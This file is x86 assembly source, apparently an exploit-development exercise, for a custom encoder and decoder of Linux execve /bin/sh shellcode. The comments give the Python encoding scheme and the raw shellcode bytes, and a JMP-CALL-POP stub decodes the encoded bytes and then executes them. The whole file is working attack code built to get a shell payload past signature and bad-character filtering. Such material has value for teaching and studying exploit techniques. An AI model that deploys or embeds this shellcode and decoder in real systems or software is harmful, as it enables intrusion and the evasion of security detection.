;author: Shihao Songss3695@drexel.edu
;decoding will be divided into two parts
;First, shift right to get the original shellcode with prefix "0xAA"
;Second, delete all the "0xAA" prefix and reformat the shellcode

; shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
; encode = ""
;
; for x in bytearray(shellcode) :
;     if x < 128:
;         x=x<<1
;         encode += '0xAA,'
;     encode += '0x'
;     encode += '%02x,'%x
;
; print encode

global _start
section .text
_start:

jmp short call_shellcode

decoder:

pop esi             ;now esi contains the address of encoded shellcode
mov edi, esi        ;this is for formatting

decode:
mov bl, byte [esi]
xor bl, 0xBB        ;bl is for testing end
jz formatting       ;First step is done

mov cl, byte [esi]
xor cl, 0XAA
jz shift_decode
inc esi
jmp short decode


shift_decode:
mov dl, byte [esi + 1]
shr dl,1            ;shift next instruction
mov byte [esi + 1], dl
inc esi
jmp short decode

formatting:
mov eax, edi
mov bl, byte [eax]
xor bl, 0xBB        ;now formatting complete
jz encoded          ;starts to execute
format:
mov bl, byte [eax]  ;bl is for testing end
mov cl, byte [eax]  ;cl is for testing prefix
xor cl, 0xAA
jnz Next_Cycle

Cycle:
mov dl, byte [eax]
xor dl, 0xBB
jz Next_Cycle       ;This cycle ends here
mov dl, byte [eax + 1]
mov byte [eax], dl
inc eax
jmp short Cycle

Next_Cycle:
inc edi
jmp short formatting

call_shellcode:

call decoder
encoded: db 0xAA,0x62,0xc0,0xAA,0xa0,0xAA,0xd0,0xAA,0x5e,0xAA,0x5e,0xAA,0xe6,0xAA,0xd0,0xAA,0xd0,0xAA,0x5e,0xAA,0xc4,0xAA,0xd2,0xAA,0xdc,0x89,0xe3,0xAA,0xa0,0x89,0xe2,0xAA,0xa6,0x89,0xe1,0xb0,0xAA,0x16,0xcd,0x80,0xBB